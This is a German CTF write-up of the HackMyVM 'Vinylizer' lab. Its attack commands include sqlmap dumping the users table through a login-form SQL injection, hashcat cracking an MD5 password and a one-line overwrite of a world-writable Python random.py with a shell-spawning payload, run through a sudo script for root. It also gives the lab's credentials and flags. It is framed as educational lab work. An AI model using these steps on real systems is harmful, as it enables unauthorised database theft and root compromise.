# Vinylizer - HackMyVM (Easy)
 
![Vinylizer.png](Vinylizer.png)

## Übersicht

*   **VM:** Vinylizer
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Vinylizer)
*   **Schwierigkeit:** Easy
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 29. April 2024
*   **Original-Writeup:** https://alientec1908.github.io/Vinylizer_HackMyVM_Easy/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel der "Vinylizer"-Challenge war die Erlangung von User- und Root-Rechten. Der Weg begann mit der Enumeration eines Webservers (Port 80), auf dem eine Login-Seite (`login.php`) gefunden wurde. Eine SQL-Injection-Schwachstelle wurde im `username`-Parameter dieser Seite mittels `sqlmap` identifiziert. Dies ermöglichte das Auslesen von Benutzerdaten aus der Datenbank `vinyl_marketplace`, darunter der Benutzer `shopadmin` mit einem MD5-Hash und der Benutzer `lana` mit einem Klartextpasswort (`password123`). Der SSH-Login als `lana` scheiterte. Der MD5-Hash für `shopadmin` wurde mit `hashcat` und `rockyou.txt` geknackt (`addicted2vinyl`), was einen erfolgreichen SSH-Login als `shopadmin` ermöglichte. Die User-Flag wurde in dessen Home-Verzeichnis gefunden. Die Privilegieneskalation zu Root erfolgte durch Ausnutzung einer unsicheren `sudo`-Regel: `shopadmin` durfte `/usr/bin/python3 /opt/vinylizer.py` als `root` ohne Passwort ausführen. Da die Python-Standardbibliothek `/usr/lib/python3.10/random.py` für `shopadmin` schreibbar war (Berechtigungen `-rwxrwxrwx`), wurde diese Datei mit einem Python-Payload überschrieben, der eine Bash-Shell startete. Bei der nächsten Ausführung von `/opt/vinylizer.py` mit `sudo` wurde das manipulierte `random`-Modul geladen und eine Root-Shell erlangt.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `vi`
*   `nikto`
*   `nmap`
*   `gobuster`
*   `Burp Suite` (impliziert für SQLMap Request-Datei)
*   `sqlmap`
*   `hashcat`
*   `ssh`
*   `python3`
*   `sudo`
*   `echo`
*   `cat`
*   `cd`
*   `ls`
*   `ll` (Alias für `ls -l` oder `ls -al`)
*   Standard Linux-Befehle (`id`, `pwd`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Vinylizer" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   IP-Findung mit `arp-scan` (`192.168.2.113`). Eintrag von `Vinylizer.hmv` in `/etc/hosts`.
    *   `nikto` auf Port 80 fand eine veraltete Apache-Version (2.4.52), fehlende Security Header, Directory Indexing für `/img/` und eine `/login.php`.
    *   `nmap`-Scan bestätigte offene Ports 22 (SSH - OpenSSH 8.9p1) und 80 (HTTP - Apache 2.4.52 "Vinyl Records Marketplace").
    *   `gobuster` auf Port 80 fand `/index.html`, `/login.php` und `/img/`.

2.  **Initial Access (SQL Injection & Hash Cracking zu `shopadmin`):**
    *   Abfangen eines POST-Requests an `/login.php` (z.B. mit Burp Suite) und Speichern als `ben2.sql`.
    *   `sqlmap -r ben2.sql --dbs --batch` identifizierte die Datenbank `vinyl_marketplace`.
    *   `sqlmap -r ben2.sql --batch -D vinyl_marketplace --tables` fand die Tabelle `users`.
    *   `sqlmap -r ben2.sql --batch -D vinyl_marketplace -T users --dump` extrahierte Benutzerdaten:
        *   `shopadmin`:`9432522ed1a8fca612b11c3980a031f6` (MD5-Hash)
        *   `lana`:`password123` (Klartext)
    *   SSH-Login als `lana:password123` scheiterte.
    *   `hashcat -a 0 -m 0 "9432522ed1a8fca612b11c3980a031f6" /usr/share/wordlists/rockyou.txt` knackte den MD5-Hash für `shopadmin`: Passwort `addicted2vinyl`.
    *   Erfolgreicher SSH-Login als `shopadmin` mit dem Passwort `addicted2vinyl`.
    *   User-Flag `I_L0V3_V1NYL5` in `/home/shopadmin/user.txt` gelesen.

3.  **Privilege Escalation (von `shopadmin` zu `root` via `sudo python3` und Library Hijacking):**
    *   `sudo -l` als `shopadmin` zeigte: `(ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/vinylizer.py`.
    *   Überprüfung der importierten Module durch Starten von `python3` und `import json; import random;` zeigte die Pfade zu den Standardbibliotheken (`/usr/lib/python3.10/random.py` und `json/__init__.py`).
    *   `ls -l /usr/lib/python3.10/random.py` offenbarte, dass die Datei `random.py` für alle Benutzer schreibbar war (`-rwxrwxrwx`). Die Datei `json/__init__.py` hatte korrekte Berechtigungen.
    *   Überschreiben von `/usr/lib/python3.10/random.py` mit einem Python-Payload, der eine Bash-Shell startete: `echo 'import pty;pty.spawn("/bin/bash")' > /usr/lib/python3.10/random.py`.
    *   Ausführung des `sudo`-Befehls: `sudo -u root /usr/bin/python3 /opt/vinylizer.py`.
    *   Das Skript `/opt/vinylizer.py` importierte das manipulierte `random`-Modul, wodurch der Payload mit Root-Rechten ausgeführt wurde.
    *   Erlangung einer Root-Shell.
    *   Root-Flag `4UD10PH1L3` in `/root/root.txt` gelesen.

## Wichtige Schwachstellen und Konzepte

*   **SQL Injection:** Eine Schwachstelle im Login-Formular (`login.php`) ermöglichte das Auslesen von Datenbankinhalten, einschließlich Passwort-Hashes und Klartextpasswörtern.
*   **Schwaches Passwort-Hashing (MD5) / Klartext-Passwörter:** Ein Passwort wurde als MD5-Hash gespeichert (leicht zu knacken), ein anderes im Klartext.
*   **Unsichere `sudo`-Konfiguration (Python-Skript):** Die Erlaubnis, ein Python-Skript als `root` ohne Passwort auszuführen, war der Hauptvektor für die Root-Eskalation.
*   **Unsichere Dateiberechtigungen (Python Standard Library):** Eine Datei der Python-Standardbibliothek (`random.py`) war für alle Benutzer schreibbar, was Python Library Hijacking ermöglichte.
*   **Python Library Hijacking:** Durch Überschreiben eines Standardmoduls, das von einem privilegierten Skript importiert wurde, konnte beliebiger Code mit Root-Rechten ausgeführt werden.
*   **Veraltete Software (Apache 2.4.52):** Obwohl nicht direkt ausgenutzt, stellt veraltete Software immer ein Risiko dar.
*   **Fehlende HTTP Security Header:** Allgemeine Web-Sicherheitsmängel.

## Flags

*   **User Flag (`/home/shopadmin/user.txt`):** `I_L0V3_V1NYL5`
*   **Root Flag (`/root/root.txt`):** `4UD10PH1L3`

## Tags

`HackMyVM`, `Vinylizer`, `Easy`, `SQL Injection`, `sqlmap`, `MD5 Cracking`, `hashcat`, `SSH`, `sudo Exploitation`, `Python Library Hijacking`, `Privilege Escalation`, `Linux`, `Web`, `Apache`
